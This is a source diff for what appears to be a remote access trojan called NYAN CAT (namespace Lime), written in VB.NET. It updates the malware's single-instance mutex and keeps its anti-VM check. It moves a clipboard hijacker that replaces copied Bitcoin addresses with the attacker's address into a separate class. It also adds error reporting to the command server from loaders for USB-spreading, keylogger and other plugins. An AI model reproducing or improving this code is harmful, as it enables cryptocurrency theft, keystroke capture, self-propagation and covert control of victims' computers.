@@ -1,5 +1,5 @@
 ﻿'##################################################################
-'##         N Y A N   C A T  |||   Updated on Aug/12/2018        ##
+'##         N Y A N   C A T  |||   Updated on Aug/18/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -52,11 +52,15 @@ Namespace Lime
                     num -= 1
                 Loop
 
-                Dim AlreadyStarted As Boolean
-                Dim mutex As Threading.Mutex = New Threading.Mutex(False, C_Settings.MTX, AlreadyStarted)
-                If Not AlreadyStarted Then
-                    End
-                End If
+                Dim createdNew As Boolean
+                Dim mutex As Threading.Mutex = New Threading.Mutex(True, C_Settings.MTX, createdNew)
+                Try
+                    If Not createdNew Then End
+                Finally
+                    If createdNew Then
+                        mutex.ReleaseMutex()
+                    End If
+                End Try
 
                 If C_Settings.ANTI Then
                     C_AntiVM.Check()
@@ -86,7 +90,7 @@ Namespace Lime
                 DW.Start()
 
                 If C_Settings.BTC_ADDR.Length > 25 Then
-                    Dim _BTC As Threading.Thread = New Threading.Thread(AddressOf _BTC_ST)
+                    Dim _BTC As Threading.Thread = New Threading.Thread(AddressOf C_BTC._BTC_ST)
                     _BTC.SetApartmentState(Threading.ApartmentState.STA)
                     _BTC.Start()
                 End If
@@ -100,7 +104,7 @@ Namespace Lime
 
         End Sub
 
-#Region "Loops"
+#Region "Plugins Loops"
 
         Private Shared Sub Checking()
             Threading.Thread.CurrentThread.Sleep(5000)
@@ -135,27 +139,6 @@ Namespace Lime
 
         End Sub
 
-        Private Shared Sub _BTC_ST()
-            While True
-                Try
-
-                    Threading.Thread.CurrentThread.Sleep(1000)
-
-                    'the address always start with 1 or 3 or bc1
-                    'the length is between 26-35 characters
-                    'more info https://en.bitcoin.it/wiki/Address
-
-                    If My.Computer.Clipboard.GetText.Length >= 26 AndAlso My.Computer.Clipboard.GetText.Length <= 35 Then
-                        If My.Computer.Clipboard.GetText.StartsWith("1") OrElse My.Computer.Clipboard.GetText.StartsWith("3") OrElse My.Computer.Clipboard.GetText.StartsWith("bc1") Then
-                            My.Computer.Clipboard.SetText(C_Settings.BTC_ADDR)
-                        End If
-                    End If
-                Catch ex As Exception
-                    C.Send("MSG" + SPL + "BTC Error! " + ex.Message)
-                End Try
-            End While
-        End Sub
-
         Private Shared Sub StartSP()
             Try
                 If GTV("_USB") = Nothing Then
@@ -171,6 +154,7 @@ Namespace Lime
                     C_Commands.Plugin(GZip(Convert.FromBase64String(GTV("_USB")), False))
                 End If
             Catch ex As Exception
+                C.Send("MSG" + SPL + "_USB Error! " + ex.Message)
             End Try
         End Sub
 
@@ -189,6 +173,7 @@ Namespace Lime
                     C_Commands.Plugin(GZip(Convert.FromBase64String(GTV("_PIN")), False))
                 End If
             Catch ex As Exception
+                C.Send("MSG" + SPL + "_PIN Error! " + ex.Message)
             End Try
         End Sub
 
@@ -207,6 +192,7 @@ Namespace Lime
                     C_Commands.Plugin(GZip(Convert.FromBase64String(GTV("_KLG")), False))
                 End If
             Catch ex As Exception
+                C.Send("MSG" + SPL + "_KLG Error! " + ex.Message)
             End Try
         End Sub
 
